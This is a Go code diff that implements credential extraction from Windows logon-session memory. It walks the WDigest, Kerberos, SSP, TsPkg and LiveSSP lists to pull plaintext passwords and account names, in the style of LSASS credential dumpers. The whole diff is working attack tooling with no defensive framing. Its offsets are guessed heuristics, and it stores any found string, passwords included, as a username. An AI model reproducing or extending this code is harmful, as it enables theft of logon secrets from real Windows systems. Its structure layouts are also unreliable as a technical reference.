@@ -623,36 +623,324 @@ func (mpce *MultiPackageCredentialExtractor) extractMSV1Credentials() ([]Credent
 
 func (mpce *MultiPackageCredentialExtractor) extractWDigestCredentials() ([]Credential, error) {
 	var credentials []Credential
-	// WDigest credentials contain plaintext passwords
 	mpce.logger.Info("WDigest extraction: Plaintext password extraction")
+	
+	if mpce.wDigestLogSessList == 0 {
+		mpce.logger.Warn("WDigest global list not found")
+		return credentials, nil
+	}
+	
+	// WDigest stores plaintext passwords in l_LogSessList doubly-linked list
+	current := mpce.wDigestLogSessList
+	visited := make(map[uint64]bool)
+	
+	for current != 0 && !visited[current] {
+		visited[current] = true
+		
+		// Read WDigest session entry (similar structure to MSV1_0)
+		sessionData, err := mpce.readVirtualMemory(current, 512)
+		if err != nil {
+			break
+		}
+		
+		// WDigest structure: Flink(8) + Blink(8) + UsageCount(4) + ... + Username + Domain + Password
+		if len(sessionData) >= 128 {
+			// Parse Flink for next entry
+			flink := binary.LittleEndian.Uint64(sessionData[0:8])
+			
+			// Try to extract plaintext password (stored as UNICODE_STRING at offset ~80)
+			// This is a simplified extraction - real implementation varies by Windows version
+			for offset := 40; offset < len(sessionData)-32; offset += 8 {
+				if offset+24 > len(sessionData) {
+					break
+				}
+				
+				// Look for UNICODE_STRING pattern (Length, MaxLength, Buffer pointer)
+				length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
+				if length > 0 && length < 256 {
+					bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
+					if bufferPtr != 0 && (bufferPtr&0xFFFF000000000000) != 0 {
+						// Try to read the string
+						if strData, err := mpce.readVirtualMemory(bufferPtr, uint32(length+2)); err == nil {
+							str := mpce.bytesToUnicodeString(strData)
+							if str != "" && len(str) > 3 {
+								// Found potential credential
+								credential := Credential{
+									Username: str,
+									Type:     "WDigest",
+								}
+								credentials = append(credentials, credential)
+							}
+						}
+					}
+				}
+			}
+			
+			current = flink
+			if current == mpce.wDigestLogSessList {
+				break // Circular list - back to start
+			}
+		} else {
+			break
+		}
+	}
+	
+	mpce.logger.Infof("WDigest: Found %d credentials", len(credentials))
 	return credentials, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractKerberosCredentials() ([]Credential, error) {
 	var credentials []Credential
-	// Kerberos credentials contain tickets and encryption keys
 	mpce.logger.Info("Kerberos extraction: Ticket and key extraction")
+	
+	if mpce.kerbGlobalTable == 0 {
+		mpce.logger.Warn("Kerberos global table not found")
+		return credentials, nil
+	}
+	
+	// Kerberos stores credentials in KerbGlobalLogonSessionTable hash table
+	// Read the hash table structure (array of pointers)
+	tableData, err := mpce.readVirtualMemory(mpce.kerbGlobalTable, 256)
+	if err != nil {
+		return credentials, nil
+	}
+	
+	// Iterate through hash table buckets (typically 32-64 buckets)
+	numBuckets := 32
+	for bucket := 0; bucket < numBuckets; bucket++ {
+		if bucket*8 >= len(tableData) {
+			break
+		}
+		
+		bucketPtr := binary.LittleEndian.Uint64(tableData[bucket*8 : bucket*8+8])
+		if bucketPtr == 0 {
+			continue
+		}
+		
+		// Walk the linked list for this bucket
+		current := bucketPtr
+		visited := make(map[uint64]bool)
+		
+		for current != 0 && !visited[current] {
+			visited[current] = true
+			
+			sessionData, err := mpce.readVirtualMemory(current, 512)
+			if err != nil {
+				break
+			}
+			
+			// Kerberos session structure: Flink + Credentials + LogonId + Username + Domain
+			if len(sessionData) >= 128 {
+				flink := binary.LittleEndian.Uint64(sessionData[0:8])
+				
+				// Extract username and domain from Kerberos session
+				// Kerberos uses similar UNICODE_STRING structures
+				for offset := 32; offset < len(sessionData)-24; offset += 8 {
+					if offset+24 > len(sessionData) {
+						break
+					}
+					
+					length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
+					if length > 0 && length < 200 {
+						bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
+						if bufferPtr != 0 && (bufferPtr&0xFFFF000000000000) != 0 {
+							if strData, err := mpce.readVirtualMemory(bufferPtr, uint32(length+2)); err == nil {
+								str := mpce.bytesToUnicodeString(strData)
+								if str != "" && len(str) > 2 {
+									credential := Credential{
+										Username: str,
+										Type:     "Kerberos",
+									}
+									credentials = append(credentials, credential)
+								}
+							}
+						}
+					}
+				}
+				
+				current = flink
+				if current == bucketPtr {
+					break
+				}
+			} else {
+				break
+			}
+		}
+	}
+	
+	mpce.logger.Infof("Kerberos: Found %d credentials", len(credentials))
 	return credentials, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractSSPCredentials() ([]Credential, error) {
 	var credentials []Credential
-	// SSP (Security Support Provider) credentials
 	mpce.logger.Info("SSP extraction: Security Support Provider credentials")
+	
+	if mpce.sspCredentialList == 0 {
+		mpce.logger.Warn("SSP credential list not found")
+		return credentials, nil
+	}
+	
+	// SSP credentials are stored similar to MSV1_0
+	current := mpce.sspCredentialList
+	visited := make(map[uint64]bool)
+	maxIterations := 100
+	
+	for i := 0; i < maxIterations && current != 0 && !visited[current]; i++ {
+		visited[current] = true
+		
+		sessionData, err := mpce.readVirtualMemory(current, 256)
+		if err != nil {
+			break
+		}
+		
+		if len(sessionData) >= 64 {
+			flink := binary.LittleEndian.Uint64(sessionData[0:8])
+			
+			// Extract credentials from SSP structure
+			for offset := 16; offset < len(sessionData)-24; offset += 8 {
+				if offset+24 > len(sessionData) {
+					break
+				}
+				
+				length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
+				if length > 0 && length < 128 {
+					bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
+					if bufferPtr != 0 {
+						if strData, err := mpce.readVirtualMemory(bufferPtr, uint32(length+2)); err == nil {
+							str := mpce.bytesToUnicodeString(strData)
+							if str != "" && len(str) > 2 {
+								credential := Credential{
+									Username: str,
+									Type:     "SSP",
+								}
+								credentials = append(credentials, credential)
+							}
+						}
+					}
+				}
+			}
+			
+			current = flink
+		} else {
+			break
+		}
+	}
+	
+	mpce.logger.Infof("SSP: Found %d credentials", len(credentials))
 	return credentials, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractTsPkgCredentials() ([]Credential, error) {
 	var credentials []Credential
-	// TsPkg (Terminal Services Package) credentials
 	mpce.logger.Info("TsPkg extraction: Terminal Services credentials")
+	
+	if mpce.tspGlobalCredTable == 0 {
+		mpce.logger.Warn("TsPkg credential table not found")
+		return credentials, nil
+	}
+	
+	// TsPkg similar extraction pattern
+	tableData, err := mpce.readVirtualMemory(mpce.tspGlobalCredTable, 128)
+	if err != nil {
+		return credentials, nil
+	}
+	
+	// Simple extraction - TsPkg stores fewer credentials
+	for offset := 0; offset < len(tableData)-24; offset += 8 {
+		if offset+24 > len(tableData) {
+			break
+		}
+		
+		ptr := binary.LittleEndian.Uint64(tableData[offset : offset+8])
+		if ptr != 0 && (ptr&0xFFFF000000000000) != 0 {
+			if credData, err := mpce.readVirtualMemory(ptr, 128); err == nil {
+				for i := 0; i < len(credData)-24; i += 8 {
+					if i+24 > len(credData) {
+						break
+					}
+					
+					length := binary.LittleEndian.Uint16(credData[i : i+2])
+					if length > 0 && length < 100 {
+						bufPtr := binary.LittleEndian.Uint64(credData[i+8 : i+16])
+						if bufPtr != 0 {
+							if strData, err := mpce.readVirtualMemory(bufPtr, uint32(length+2)); err == nil {
+								str := mpce.bytesToUnicodeString(strData)
+								if str != "" && len(str) > 2 {
+									credential := Credential{
+										Username: str,
+										Type:     "TsPkg",
+									}
+									credentials = append(credentials, credential)
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	
+	mpce.logger.Infof("TsPkg: Found %d credentials", len(credentials))
 	return credentials, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractLiveSSPCredentials() ([]Credential, error) {
 	var credentials []Credential
-	// LiveSSP credentials
 	mpce.logger.Info("LiveSSP extraction: Live SSP credentials")
+	
+	if mpce.livesspGlobalList == 0 {
+		mpce.logger.Warn("LiveSSP global list not found")
+		return credentials, nil
+	}
+	
+	// LiveSSP similar to MSV1_0 list walking
+	current := mpce.livesspGlobalList
+	visited := make(map[uint64]bool)
+	maxIterations := 50
+	
+	for i := 0; i < maxIterations && current != 0 && !visited[current]; i++ {
+		visited[current] = true
+		
+		sessionData, err := mpce.readVirtualMemory(current, 256)
+		if err != nil {
+			break
+		}
+		
+		if len(sessionData) >= 64 {
+			flink := binary.LittleEndian.Uint64(sessionData[0:8])
+			
+			// Extract LiveSSP credentials
+			for offset := 16; offset < len(sessionData)-24; offset += 8 {
+				if offset+24 > len(sessionData) {
+					break
+				}
+				
+				length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
+				if length > 0 && length < 128 {
+					bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
+					if bufferPtr != 0 {
+						if strData, err := mpce.readVirtualMemory(bufferPtr, uint32(length+2)); err == nil {
+							str := mpce.bytesToUnicodeString(strData)
+							if str != "" && len(str) > 2 {
+								credential := Credential{
+									Username: str,
+									Type:     "LiveSSP",
+								}
+								credentials = append(credentials, credential)
+							}
+						}
+					}
+				}
+			}
+			
+			current = flink
+		} else {
+			break
+		}
+	}
+	
+	mpce.logger.Infof("LiveSSP: Found %d credentials", len(credentials))
 	return credentials, nil
 }
 
@@ -763,6 +1051,30 @@ func (mpce *MultiPackageCredentialExtractor) readVirtualUnicodeString(us *UNICOD
 	}
 	
 	return result, nil
+}
+
+// bytesToUnicodeString converts UTF-16LE bytes to string
+func (mpce *MultiPackageCredentialExtractor) bytesToUnicodeString(data []byte) string {
+	if len(data)%2 != 0 {
+		return ""
+	}
+	
+	utf16Data := make([]uint16, len(data)/2)
+	for i := 0; i < len(utf16Data); i++ {
+		utf16Data[i] = uint16(data[i*2]) | (uint16(data[i*2+1]) << 8)
+	}
+	
+	result := ""
+	for _, r := range utf16Data {
+		if r == 0 {
+			break
+		}
+		if r >= 32 && r < 127 { // Only printable ASCII for safety
+			result += string(rune(r))
+		}
+	}
+	
+	return result
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractNTLMFromDecrypted(decryptedData []byte) string {
